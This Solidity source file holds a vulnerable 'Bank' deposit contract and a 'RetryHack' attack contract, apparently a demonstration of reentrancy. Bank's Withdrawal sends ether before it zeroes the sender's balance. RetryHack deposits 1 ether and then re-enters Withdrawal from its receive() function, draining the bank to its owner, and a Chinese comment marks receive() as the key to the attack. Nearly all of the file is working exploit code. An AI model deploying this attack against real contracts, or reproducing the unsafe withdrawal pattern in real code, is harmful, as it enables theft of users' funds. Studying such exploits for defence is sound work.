// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

// Uncomment this line to use console.log
// import "hardhat/console.sol";
contract Bank{
    mapping (address=>uint) public Deposit_Balance;

    address public owner;

    event DepositEth_Event(uint amount);
    event Withdrawal_Event(uint amount);

    constructor() payable{
        owner = msg.sender;
    }
    function Deposit() payable public{
        Deposit_Balance[msg.sender] += msg.value;
        emit DepositEth_Event(msg.value);
    }
    function Withdrawal() payable public{
        require(Deposit_Balance[msg.sender] != 0, "You can't withdraw yet");
        emit Withdrawal_Event(Deposit_Balance[msg.sender]);
        (bool success, ) = msg.sender.call{value: Deposit_Balance[msg.sender]}(new bytes(0));
        require(success, "transfer failed");
        Deposit_Balance[msg.sender] = 0;
    }
    //未匹配到函数编码时调用，没有receive函数时，转账时会调用
    fallback() payable external{
        Deposit_Balance[msg.sender] += msg.value;
        emit DepositEth_Event(msg.value);
    }
     
}

   
contract RetryHack{
    address public owner;
    address public bank;
    bytes public Deposit;
    bytes public Withdrawal;
    string public errormsg;
    uint16 public len = 0;

    constructor(address _bank) payable{
        owner = msg.sender;
        bank = _bank;
        Deposit = abi.encodeWithSignature("Deposit()");
        Withdrawal = abi.encodeWithSignature("Withdrawal()");
    }
    
    function set(address _bank, string memory _Desposit, string memory _Withdrawal) public {
        bank = _bank;
        Deposit = abi.encodeWithSignature(_Desposit);
        Withdrawal = abi.encodeWithSignature(_Withdrawal);
    }
    function hack() payable public
    {
        len = 0;
        (bool success, ) = address(bank).call{value:1 ether}(Deposit);
        require(success, "call Deposit failed");
        (bool success_1, ) = address(bank).call(Withdrawal);
        require(success_1, "call withdrawal failed");
    }

    function getBalance() public view returns(uint){
        return address(this).balance;
    }

    function withdraw() public{
        require(msg.sender==owner, "you are not owner");
        (bool success, ) =  payable(owner).call{value: address(this).balance}("");
        require(success, "call withdrawal failed");
    }
    //重入攻击的关键
    receive() external payable{
        if(bank.balance >= 1 ether)
        {
            (bool success_1, ) = address(bank).call(Withdrawal);
            require(success_1, "call withdrawal failed");
        }
        
    }
    // fallback() external payable{
        
    // }
    
}

